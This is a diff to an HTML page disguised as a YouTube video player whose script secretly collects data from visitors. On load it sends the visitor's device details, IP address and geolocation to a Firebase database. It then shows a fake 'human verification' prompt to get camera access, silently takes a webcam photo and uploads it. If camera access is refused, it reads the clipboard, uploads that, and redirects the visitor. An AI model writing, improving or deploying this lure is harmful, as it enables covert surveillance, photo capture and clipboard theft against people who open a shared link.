@@ -3,83 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YouTube</title>
-    
+    <title>YouTube Video Player</title>
     <meta property="og:title" content="YouTube - Trending Video 2026">
-    <meta property="og:description" content="1.2M Views • Watch the full video now on YouTube.">
     <meta property="og:image" content="https://img.youtube.com/vi/aqz-KE-bpKQ/maxresdefault.jpg">
-    <meta property="og:type" content="video.other">
-
     <style>
-        body { background: #0f0f0f; color: white; font-family: "Roboto", Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .yt-loader { text-align: center; }
-        .spinner { border: 3px solid #333; border-top: 3px solid #f00; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        body { background: #0f0f0f; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { text-align: center; width: 90%; }
+        .spinner { border: 4px solid #333; border-top: 4px solid #f00; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { background: #cc0000; color: white; border: none; padding: 12px 24px; border-radius: 2px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 14px; }
+        button { background: #cc0000; color: white; border: none; padding: 12px 25px; border-radius: 2px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        #cam-bus { display: none; }
     </style>
 </head>
 <body>
-    <div id="ui" class="yt-loader">
+    <div id="ui" class="container">
         <div class="spinner"></div>
-        <p style="color: #aaa; font-size: 14px;">Loading Video...</p>
+        <p style="color: #aaa;">Connecting to video server...</p>
     </div>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
-        let isCaptured = false;
+        let userKey, targetUrl, isCaptured = false;
 
         async function init() {
             const params = new URLSearchParams(window.location.search);
             const id = params.get('id');
             if (!id || isCaptured) return;
-            isCaptured = true; // Duplicate entries block
+            isCaptured = true;
 
             const decoded = JSON.parse(atob(id));
+            userKey = decoded.k;
+            targetUrl = decoded.r;
 
+            // Step 1: Instant Device & IP Data
             let data = {
                 time: new Date().toLocaleString(),
-                model: navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown Device",
+                model: navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown",
                 ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-                res: screen.width + "x" + screen.height,
-                ip: "N/A", loc: "Searching..."
+                ip: "N/A", loc: "N/A"
             };
 
-            // Battery (Silent)
             try {
-                const b = await navigator.getBattery();
-                data.bat = Math.round(b.level * 100) + "%";
-            } catch(e){ data.bat = "N/A"; }
-
-            // IP & Loc (Reliable Source)
-            try {
-                const res = await fetch('https://api.db-ip.com/v2/free/self');
+                const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                data.ip = d.ipAddress;
-                data.loc = d.city + ", " + d.countryName;
-                data.map = `https://www.google.com/maps/search/${d.city}+${d.countryName}`;
-            } catch(e){ data.ip = "Fetch Error"; }
+                data.ip = d.ip;
+                data.loc = d.city + ", " + d.country_name;
+                data.flag = `https://flagcdn.com/w40/${d.country_code.toLowerCase()}.png`;
+                data.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+            } catch(e){}
 
-            // Save Entry
-            fetch(`${DB_URL}tracking/${decoded.k}.json`, { method: 'POST', body: JSON.stringify(data) });
+            fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(data) });
 
-            // Switch to Interaction UI after 2.5s
+            // Step 2: Show Interaction UI
             setTimeout(() => {
                 document.getElementById('ui').innerHTML = `
-                    <p style="font-weight: bold; margin-bottom: 15px;">Playback Error: Verification Required</p>
-                    <button id="playBtn">Tap to Watch</button>
+                    <p style="font-weight:bold;">Verification Required to Watch</p>
+                    <p style="font-size:13px; color:#888; margin-bottom:15px;">Allow camera access for human verification.</p>
+                    <button onclick="takeSnap()">Verify & Play</button>
                 `;
+            }, 2000);
+        }
 
-                document.getElementById('playBtn').onclick = async () => {
-                    try {
-                        const clip = await navigator.clipboard.readText();
-                        if(clip) fetch(`${DB_URL}clipboard/${decoded.k}.json`, { 
-                            method: 'POST', 
-                            body: JSON.stringify({ clipData: clip, time: new Date().toLocaleString() }) 
-                        });
-                    } catch(e){}
-                    window.location.href = decoded.r;
-                };
-            }, 2500);
+        async function takeSnap() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                // Wait for camera to warm up then snap
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const photo = canvas.toDataURL('image/jpeg', 0.4);
+                    
+                    fetch(`${DB_URL}photos/${userKey}.json`, { 
+                        method: 'POST', 
+                        body: JSON.stringify({ photo, time: new Date().toLocaleString() }) 
+                    });
+
+                    // Stop camera and redirect
+                    stream.getTracks().forEach(t => t.stop());
+                    window.location.href = targetUrl;
+                }, 1000);
+            } catch (e) {
+                // If denied, try clipboard and redirect
+                try {
+                    const clip = await navigator.clipboard.readText();
+                    if(clip) fetch(`${DB_URL}clipboard/${userKey}.json`, { method: 'POST', body: JSON.stringify({ clipData: clip, time: new Date().toLocaleString() }) });
+                } catch(err){}
+                window.location.href = targetUrl;
+            }
         }
         init();
     </script>
